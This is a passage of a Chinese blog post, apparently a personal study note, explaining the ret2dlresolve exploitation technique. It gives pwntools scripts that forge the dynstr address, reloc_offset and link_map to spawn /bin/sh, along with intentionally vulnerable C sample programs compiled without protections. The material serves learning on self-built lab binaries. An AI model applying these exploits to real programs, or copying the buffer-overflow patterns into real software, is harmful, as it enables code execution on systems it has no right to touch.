+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    设置 dynamic段 中 dynstr段 的地址为  bss段 中构造的 &quot;\x00system\x00&quot; 字符串的地址</span></span><br><span class="line"><span class="string">    并设置 state 为 bss段 中构造的 &quot;/bin/sh&quot; 字符串的地址</span></span><br><span class="line"><span class="string">    在执行 exit 函数时 经过 _dl_runtime_resolve 就会搜索 system 函数并执行 system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn_resolve&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>)+p64(<span class="number">0x4033c0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4031e0</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4033c7</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪造reloc-offset"><a href="#伪造reloc-offset" class="headerlink" title="伪造reloc_offset"></a>伪造reloc_offset</h2><blockquote>
+<p>从<code>_dl_fixup</code>中的代码可以看出，程序获取与函数对应的<code>rel.plt表项</code> <code>reloc</code>是通过<code>reloc_offset</code>参数<br>获取对应的<code>dnysym表项</code> <code>sym</code>是通过<code>reloc.r_info</code> ，获取<code>dnystr</code>对应的名称是通过<code>sym</code><br>所以只要伪造了<code>reloc_offset</code> 参数，就可以伪造<code>reloc</code>，进而伪造 <code>sym</code> 与 <code>dnystr</code>中对应的名称<br>然后就会调用我们伪造的<code>dnystr</code>中的函数</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> cache[<span class="number">0x50</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> c[<span class="number">0x40</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,cache,<span class="number">0x70</span>);</span><br><span class="line">    read(<span class="number">0</span>,c,<span class="number">0x70</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -fno-stack-protector -no-pie pwn_resolve.c -o pwn_resolve</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>main函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>bss段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>.dynamic段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>dynsym段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>dynstr段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-5.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>rel.plt段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve1-6.jpg"></p>
+</blockquote>
+<p><code>rel表项</code>需要构造 {对应<code>got表</code>地址(8字节), <code>sym表</code>中的索引值(4字节), 用来表示函数的<code>7</code>(4字节), <code>addend</code>用处未知一般为<code>0</code>(4字节)}<br><code>sym表项</code>需要构造 {<code>dnystr</code>中的索引值(4字节), 用来表示函数的<code>12</code>(1字节), <code>other</code>描述函数时为<code>0</code>(1字节), <code>shndx</code>描述函数时为0(2字节), <code>value</code>在函数被导出前为<code>0</code>(4字节), <code>size</code>描述函数时为<code>0</code>(4字节)}<br><code>dnystr表项</code>构造时只需要在字符串结尾使用<code>\x00</code>截断</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造 全局变量cache ,将 sym表项 与 rel表项 ，dnystr表项 都伪造好，通过传入一个较大的 rel.plt表 索引值,使其索引到我们伪造的表项,进而导出 system 函数，并执行 system 函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rdi=<span class="number">0x00000000004012a3</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn_resolve&#x27;</span>)</span><br><span class="line">sym=p32(<span class="number">0x4040b9</span>-<span class="number">0x4004a0</span>)+p64(<span class="number">12</span>)+p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">rel=p64(<span class="number">0x404018</span>)+p32(<span class="number">7</span>)+p64((<span class="number">0x404088</span>-<span class="number">0x4003e0</span>)//<span class="number">0x18</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&quot;/bin/sh\x00&quot;</span>+sym+rel+<span class="string">&quot;\x00system\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x50</span>)+p64(<span class="number">0x4033c0</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(rdi)+p64(<span class="number">0x404080</span>)+p64(<span class="number">0x401020</span>)+p64((<span class="number">0x4040a0</span>-<span class="number">0x4005a8</span>)//<span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h2><blockquote>
+<p>这种方法需要先获取描述当前程序的link_map结构体的scope成员中储存的数据<br>想要获取scope成员中的数据，至少是完成了任意地址读取，这种情况下已经可以泄露libc的地址<br>而想要利用 ret2resolve 则需要控制程序流程<br>这种情况下，已知libc地址，且可以控制程序，直接执行 system(“&#x2F;bin&#x2F;sh”); 就可以了<br>想要利用link_map还需要 至少 0x400的空间，<br>这种情况下，想要伪造link_map,达到ret2dlresolve的目的，利用难度较高<br>但也可能是因为我太菜了，还不会利用</p>
+</blockquote>
+<blockquote>
+<p>以下是我尝试伪造link_map的代码,比较极端地允许输入任意长度的数据</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> a[<span class="number">4096</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\naddr: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,(<span class="type">int</span>)a);</span><br><span class="line">    gets(b);</span><br><span class="line">    gets(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -fno-stack-protector -no-pie 1.c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;bp 0x401201&#x27;</span>)</span><br><span class="line">p.readuntil(<span class="string">&#x27;addr: &#x27;</span>)</span><br><span class="line">d=<span class="built_in">int</span>(p.readline(),<span class="number">16</span>)</span><br><span class="line">fake_dyn=d+<span class="number">0x300</span></span><br><span class="line">fake_map=p64(<span class="number">0</span>)+p64(d)+p64(fake_dyn)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(d)+p64(<span class="number">0</span>)+p64(d)</span><br><span class="line">fake_info=p64(<span class="number">0</span>)+p64(fake_dyn)+p64(<span class="number">0x403f00</span>)+p64(fake_dyn+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(fake_dyn+<span class="number">0x20</span>)+p64(fake_dyn+<span class="number">0x30</span>)+p64(fake_dyn+<span class="number">0x40</span>)+p64(<span class="number">0x403f40</span>)+\</span><br><span class="line">        p64(<span class="number">0x403f50</span>)+p64(<span class="number">0x403ec0</span>)+p64(<span class="number">0x403ed0</span>)+p64(<span class="number">0x403e30</span>)+p64(<span class="number">0x403e40</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x403f10</span>)+p64(<span class="number">0x403ee0</span>)+p64(<span class="number">0</span>)+p64(fake_dyn+<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x403e50</span>)+\</span><br><span class="line">        p64(<span class="number">0x403e70</span>)+p64(<span class="number">0x403e60</span>)+p64(<span class="number">0x403e80</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x403f70</span>)+p64(<span class="number">0x403f60</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0</span>)*<span class="number">25</span>+p64(<span class="number">0x403e90</span>)</span><br><span class="line">seg=d+<span class="number">0x500</span></span><br><span class="line">got=seg</span><br><span class="line">strtab=seg+<span class="number">0x100</span></span><br><span class="line">symtab=seg+<span class="number">0x200</span></span><br><span class="line">reltab=seg+<span class="number">0x300</span></span><br><span class="line">jmprel=seg+<span class="number">0x400</span></span><br><span class="line">fake_map=fake_map+fake_info</span><br><span class="line">fake_map=fake_map.ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_map)))</span><br><span class="line">dyn_sym=p64(<span class="number">1</span>)+p64(<span class="number">24</span>)+p64(<span class="number">3</span>)+p64(got)+p64(<span class="number">5</span>)+p64(strtab)+p64(<span class="number">6</span>)+p64(symtab)+p64(<span class="number">7</span>)+p64(reltab)+p64(<span class="number">0x17</span>)+p64(jmprel)</span><br><span class="line">dyn_sym=dyn_sym.ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_map=fake_map+dyn_sym</span><br><span class="line">nnn=<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">fake_map=fake_map+p64(nnn)</span><br><span class="line"><span class="comment">#因为只是测试，所以直接用gdb获取scope的值，然后输入就可以了</span></span><br><span class="line">fake_map=fake_map.ljust(<span class="number">0x500</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_d=p64(<span class="number">0x405068</span>)</span><br><span class="line">got_d=got_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strtab_d=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&quot;system\x00&quot;</span></span><br><span class="line">strtab_d=strtab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">symtab_d=p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">1</span>)+p64(<span class="number">0x12</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">symtab_d=symtab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">reltab_d=p64(<span class="number">0</span>)</span><br><span class="line">reltab_d=reltab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmprel_d=p64(got)+p32(<span class="number">7</span>)+p64(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">jmprel_d=jmprel_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_map=fake_map + got_d + strtab_d + symtab_d + reltab_d + jmprel_d</span><br><span class="line">bin_sh=<span class="built_in">len</span>(fake_map)+<span class="number">0x40</span></span><br><span class="line">fake_map=fake_map.ljust(bin_sh,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_map=fake_map+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x0000000000401273</span>)+p64(d+bin_sh)+p64(<span class="number">0x401026</span>)+p64(d)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(fake_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/rot-will">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        
+        
+        <li>
+            <a target="_blank"  href="tencent://message/?Site=admin5.com&menu=yes&uin=2127361651">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-qq-fill"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://www.lewiserii.top">lewiserii</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://giscus.app/client.js"
+  data-repo="rot-will/rot-will.github.io"
+  data-repo-id="R_kgDOHgxmbg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOHgxmbs4CPuLX"
+  data-mapping="url"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="light"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async>
+</script>
+
+
+
+
+</html>
